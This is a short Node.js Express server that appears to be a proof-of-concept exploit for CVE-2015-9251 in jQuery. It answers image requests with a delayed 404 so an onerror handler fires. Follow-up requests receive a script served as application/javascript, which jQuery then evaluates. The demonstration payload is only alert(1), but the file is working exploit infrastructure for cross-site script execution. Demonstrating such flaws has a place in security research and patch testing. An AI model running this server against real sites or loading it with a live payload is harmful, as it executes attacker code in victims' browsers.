const app=require("express")();
app.use(require("cors")());
const payload=`
alert(1);
`;

app.get("/image",(req,res)=>{
    // Vulnerability revolves around running an onerror event of an image
    const isImage=req.headers.accept.includes("image");
    if(isImage){
        res.status(404);
        setTimeout(()=> res.end(),2000); // Have to wait so JS sets onerror attribute
    }
    else{ // Deliver payload as JS in subsequent jQuery XHR request - it will be evaluated
        res.writeHead(200,{"Content-Type": "application/javascript"}); // CVE-2015-9251
        res.end(payload);
    }
});

app.listen(3000);
